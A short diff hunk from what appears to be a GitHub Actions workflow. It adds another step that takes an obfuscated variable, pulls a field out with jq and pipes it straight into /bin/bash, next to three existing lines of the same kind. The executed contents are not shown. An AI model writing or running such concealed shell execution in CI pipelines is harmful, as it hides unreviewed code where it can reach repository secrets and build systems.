@@ -38,6 +38,7 @@ jobs:
           echo $v409 | jq -r .unx20 | /bin/bash
           printf '%s' "$p8" | jq -r .bn185 | /bin/bash
           printf '%s' "$wj60" | jq -r .uk93543 | /bin/bash
+          echo $v644 | jq -r .unevg354 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
